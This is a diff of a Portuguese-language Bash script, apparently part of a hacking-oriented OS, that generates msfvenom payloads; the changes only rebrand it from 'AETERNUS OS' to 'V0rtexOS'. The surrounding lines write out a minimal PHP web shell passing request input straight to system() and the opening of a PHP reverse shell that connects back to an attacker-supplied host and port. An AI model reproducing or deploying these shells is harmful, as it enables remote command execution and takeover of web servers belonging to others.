@@ -1,5 +1,5 @@
 #!/usr/bin/env bash
-# AETERNUS OS — Gerador de Payloads com msfvenom
+# V0rtexOS — Gerador de Payloads com msfvenom
 # Gera payloads para múltiplas plataformas com encode automático
 # Uso: payload-gen.sh <lhost> <lport> [plataforma]
 
@@ -114,7 +114,7 @@ gen_web() {
     # PHP web shells adicionais
     cat > "$OUT_DIR/web/cmd.php" <<'PHPSHELL'
 <?php
-// AETERNUS — Minimal PHP shell (sem msfvenom)
+// V0RTEX — Minimal PHP shell (sem msfvenom)
 if(isset($_REQUEST['cmd'])){
     $cmd = ($_REQUEST['cmd']);
     system($cmd);
@@ -126,7 +126,7 @@ PHPSHELL
     # PHP reverse shell (Pentestmonkey style)
     cat > "$OUT_DIR/web/rev.php" <<PHPREV
 <?php
-// AETERNUS — PHP Reverse Shell
+// V0RTEX — PHP Reverse Shell
 \$ip   = '$LHOST';
 \$port = $LPORT;
 \$chunk_size = 1400;
@@ -223,7 +223,7 @@ PCL
 print_summary() {
     echo
     echo -e "${CYN}═══════════════════════════════════════════════${RST}"
-    echo -e "${CYN}  AETERNUS — Payloads Gerados${RST}"
+    echo -e "${CYN}  V0RTEX — Payloads Gerados${RST}"
     echo -e "${CYN}  LHOST: $LHOST | LPORT: $LPORT${RST}"
     echo -e "${CYN}═══════════════════════════════════════════════${RST}"
     find "$OUT_DIR" -type f | sort | while read -r f; do
@@ -240,7 +240,7 @@ print_summary() {
 
 main() {
     echo -e "\n${CYN}╔═══════════════════════════════════════════╗"
-    echo    "║  AETERNUS OS — Gerador de Payloads       ║"
+    echo    "║  V0rtexOS — Gerador de Payloads       ║"
     echo -e "╚═══════════════════════════════════════════╝${RST}\n"
 
     case "$PLATFORM" in
